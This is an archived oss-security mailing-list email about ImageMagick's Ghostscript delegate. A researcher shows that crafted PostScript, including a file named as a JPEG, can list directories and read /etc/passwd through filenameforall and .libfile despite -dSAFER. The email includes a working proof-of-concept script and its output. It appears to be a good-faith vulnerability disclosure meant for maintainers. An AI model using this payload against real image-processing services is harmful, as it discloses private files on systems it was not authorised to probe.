X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2963" "Wednesday" "28" "September" "2016" "13:52:36" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "101" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Date:" nil nil "9" "2016092820:52:36" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 28  101/2963  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 14333 invoked by uid 550); 28 Sep 2016 20:56:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11928 invoked from network); 28 Sep 2016 20:53:10 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=S5XocsZs+XzT5FKmBie0Si0QegDdU3UweWeojvttdrY=;
        b=AnzJqvUC8XjfHfin/tzr5z7KFtr9U0fk6O7HpklwOP2WUd0gLGozw69Lcu2SnOQ5zF
         WuIUYHiK+1Q0J0hBT7yaE6ihuXy6wGEacVT9byXcG2FSUDKniUbrkwYsmHrI4/dE+hlp
         8BN0/k1KiUGELHJkEjOlYVxdzVJEVQLOHjP2wIaIcVoALiGzeWuj66rUt48uH/3CWzlm
         Iwmu5bRhkdXf3Toyz1whDm6pwDxI98kQoKJbrOuTaPAqqN5XMR9vQHAKzMWWr5scbT4U
         qzbFhfz7TpkE6QcWwM/EYHw6Iyxd/GB1+3sH+JbHlt6yhPujceln9tLep9SSTmyiDugr
         ZU2w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=S5XocsZs+XzT5FKmBie0Si0QegDdU3UweWeojvttdrY=;
        b=PKHk6d1xazAgWM2TvrQtLIOdR//ozgxAyaKtC6i7oNWFROxX+RST+cRaDTq61aZ3/O
         aRyA2SR1d4LkMoRblKmK9hFMcstXLL+u3u6/ZVd9B8yFrzRoxdt8SynzHt9Fh23OsOc2
         J3aseQAgTEPR/VTZh57wZSCnq3ZWCSH1ePPJ3YLI6/7W3qF0Pkcj9xp60AL+n2PEWDek
         NEHW0/I3Y5a9Zo26aV81vsyJ4zwbFsbMHP1MmgEWOrd1dLfJJFcVOq0o7OqO4265lgXB
         17xG//IF1Avup3hDkIHI4e/V0vbRC0bZL60uLomn+rMFpPyli9nHQbjnwf3j1nSrm+2Y
         2ERg==
X-Gm-Message-State: AA6/9RkBNorpYsdT+QzjE8tadcIJlRu28QdL0gAewGWlvNS6mksYN9KHGIHromVqw5db4/bv1TX8KNbbIayYIeO2
X-Received: by 10.31.216.5 with SMTP id p5mr15882576vkg.159.1475095977359;
 Wed, 28 Sep 2016 13:52:57 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
 <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
 <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
Message-ID: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Date: Wed, 28 Sep 2016 13:52:36 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: oss-security@lists.openwall.com

On Wed, Sep 28, 2016 at 11:16 AM, Tavis Ormandy <taviso@google.com> wrote:
> On Tue, Sep 27, 2016 at 7:56 AM, Bob Friesenhahn
> <bfriesen@simple.dallas.tx.us> wrote:
>>
>> On Tue, 27 Sep 2016, Jakub Wilk wrote:
>>
>>> * Bob Friesenhahn <bfriesen@simple.dallas.tx.us>, 2016-09-27, 08:48:
>>>>
>>>> From my own investigations, I used
>>>>
>>>>  identify -debug all "d:"
>>>>
>>>> and see that a temporary file is reported to be created and then the program hangs which no apparent CPU usage.
>>>
>>>
>>> strace tells me that it waits for input on stdin.
>>> This is a simpler way to make it "hang":
>>>
>>>  identify -
>>
>>
>> This is what I expected was happening.  The main thing to investigate is if the "ImageTragick" patches distributions are using do protect against this possible issue as well.
>>
>
> You know, you reminded me that the pdf and/or the ps delegate probably
> allows filesystem enumeration via filenameforall, as far as I know
> that's permitted with -dSAFER. I think that's probably unexpected.
>
> For example, if you try to identify a file like this, it will list
> local usernames on stdout, I guess a real attack would have to encode
> that in the output somehow, but I only know enough postscript to know
> i'd rather write bf. Might be a fun exercise for masochistic hackers
> though.
>
> $ cat whatever.jpeg
> %PDF-1.0
> (/home/*) {==} 256 string filenameforall
> $ identify whatever.jpeg
> (/home/taviso)
> identify.im6: Postscript delegate failed `whatever.jpeg': No such file
> or directory @ error/pdf.c/ReadPDFImage/677.
>
> Tavis.

Maybe I'm missing something, because .libfile also works, this seems
like free arbitrary file disclosure?

Here is the code I'm testing with (Note: I really don't know much
postscript - and I hate it).

$ cat test.ps
/dumpname {
    dup             % copy filename
    dup             % copy filename
    print           % print filename
    (\n) print      % print newline
    status          % stat filename
    {
        (stat succeeded\n) print
        ( ctime:) print
        64 string cvs print
        ( atime:) print
        64 string cvs print
        ( size:) print
        64 string cvs print
        ( blocks:) print
        64 string cvs print
        (\n) print
        (\n) print
    }{
        (unable to stat\n\n) print
    } ifelse
    .libfile        % open as library
    {
        (.libfile returned file\n\n) print
        64 string readstring
        pop         % discard result (should proably test)
        print
        (\n) print
    }{
        (.libfile returned string\n) print
        print
        (\n) print
    } ifelse
} def

(/etc/pass*) /dumpname load 256 string filenameforall

$ identify test.ps
/etc/passwd
stat succeeded
 ctime:1474998792 atime:1474998792 size:2662 blocks:8

.libfile returned file

root:x:0:0:root:/root:/bin/bash

It seems obvious you can manipulate the output based on this. I'd be
interested to hear why I'm wrong about this.

Tavis.
